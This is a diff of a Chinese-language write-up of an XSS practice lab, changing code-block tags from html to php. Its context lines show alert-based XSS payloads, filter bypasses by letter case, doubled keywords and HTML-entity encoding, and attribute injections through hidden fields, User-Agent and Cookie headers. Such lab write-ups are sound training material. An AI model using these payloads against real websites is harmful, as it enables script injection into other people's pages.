@@ -17,7 +17,7 @@ echo "<h2 align=center>欢迎用户".$str."</h2>";
 ```
 
 这一关没有什么过滤，它会将我们的name值在网页中输出，所以我们尝试注入：
-```html
+```php
 <script>alert(1)</script>
 ```
 
@@ -142,14 +142,14 @@ payload:
 
 
 用上一关的payload试一下：
-```html
+```php
 "><a href="javascript:alert(`xss`);">xss</a>
 ```
 ![Pasted image 20240826210514.png](/img/user/picture/Pasted%20image%2020240826210514.png)
 发现href关键词也被过滤了
 
 用另一个试一下：
-```html
+```php
 sd"></br><img src="javascript:alert('1');">
 ```
 ![Pasted image 20240826210653.png](/img/user/picture/Pasted%20image%2020240826210653.png)
@@ -157,7 +157,7 @@ sd"></br><img src="javascript:alert('1');">
 
 这题可以用大小写绕过
 
-```html
+```php
 "><a hRef="javascript:alert(`xss`);">xss</a>
 ```
 
@@ -168,13 +168,13 @@ sd"></br><img src="javascript:alert('1');">
 ![Pasted image 20240826210829.png](/img/user/picture/Pasted%20image%2020240826210829.png)
 
 我们用上一关的payload试一下：
-```html
+```php
 "><a hRef="javascript:alert(`xss`);">xss</a>
 ```
 ![Pasted image 20240826211150.png](/img/user/picture/Pasted%20image%2020240826211150.png)
 发现`href`和`script`关键词没有了
 我们试一下双写可不可以绕过：
-```html
+```php
 "><a hRehReff="javascrscriptipt:alert(`xss`);">xss</a>
 ```
 成功
@@ -187,7 +187,7 @@ sd"></br><img src="javascript:alert('1');">
 
 ![Pasted image 20240826211915.png](/img/user/picture/Pasted%20image%2020240826211915.png)
 发现这里有一个超链接，我们尝试用伪协议利用一下
-```html
+```php
 javascript:alert(`xss`);
 ```
 ![Pasted image 20240826212008.png](/img/user/picture/Pasted%20image%2020240826212008.png)
@@ -198,7 +198,7 @@ javascript:alert(`xss`);
 t   &#116
 :   &#58
 
-```html
+```php
 javascrip&#116:alert(`xss`);
 ```
 
@@ -208,11 +208,11 @@ javascrip&#116:alert(`xss`);
 ![Pasted image 20240826212213.png](/img/user/picture/Pasted%20image%2020240826212213.png)
 
 尝试一下测试payload：
-```html
+```php
 '';!--"<XSS>=&{()}
 ```
 ![Pasted image 20240826212448.png](/img/user/picture/Pasted%20image%2020240826212448.png)
-注意这种上面双引号是没有办法闭合的，所以不太可能可以绕过htmlspecials()
+注意这种上面双引号是没有办法闭合的，所以不太可能可以绕过`htmlspecials()`
 
 我们再测试几个输入，看看什么是合法的
 ![Pasted image 20240826212753.png](/img/user/picture/Pasted%20image%2020240826212753.png)
@@ -220,7 +220,7 @@ javascrip&#116:alert(`xss`);
 好吧，要有关键词`http://`
 
 我们修改一下上一关payload：
-```html
+```php
 javascrip&#116:alert(`http://`);
 ```
 
@@ -243,18 +243,18 @@ javascrip&#116:alert(`http://`);
 <input name="t_sort"  value="" type="hidden">
 ```
 有三个输入框？为什么type为hidden？hidden 的意思为定义隐藏的输入字段。尝试使用firebug将hidden全改成submit。出现一个按钮，点击发现URL变成
-```html
+```php
 http://10.10.10.135/xss/level10.php?t_link=&t_history=&t_sort=
 ```
 
 
 尝试构造xss语句：
-```html
+```php
 http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 ```
 
 查看网页源代码：
-```html
+```php
 <input name="t_link"  value="" type="hidden">
 <input name="t_history"  value="" type="hidden">
 <input name="t_sort"  value="3" type="hidden">
@@ -262,7 +262,7 @@ http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 
 发现只有t_sort参数才有返回数据。
 
-```html
+```php
 ?t_sort=3"onmouseover='alert(1)' type="text"
 ```
 
@@ -273,7 +273,7 @@ http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 ![Pasted image 20240827112205.png](/img/user/picture/Pasted%20image%2020240827112205.png)
 发现t_sort中的值也被实体化了
 但是这一题多了一个t_ref值
-```html
+```php
 <input name="t_ref" value="" type="hidden">
 ```
 
@@ -297,7 +297,7 @@ http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 ![Pasted image 20240827195144.png](/img/user/picture/Pasted%20image%2020240827195144.png)
 这题看样子就是将我们的UA头进行了保存
 所以说我们在UA头加入如下payload即可
-```html
+```php
 "onmouseover='alert(1)' type="text"
 ```
 
@@ -310,7 +310,7 @@ http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 
 所以我们直接抓包在cookie中加入payload即可
 ![Pasted image 20240827200609.png](/img/user/picture/Pasted%20image%2020240827200609.png)
-```html
+```php
 "onmouseover='alert(1)' type="text"
 ```
 
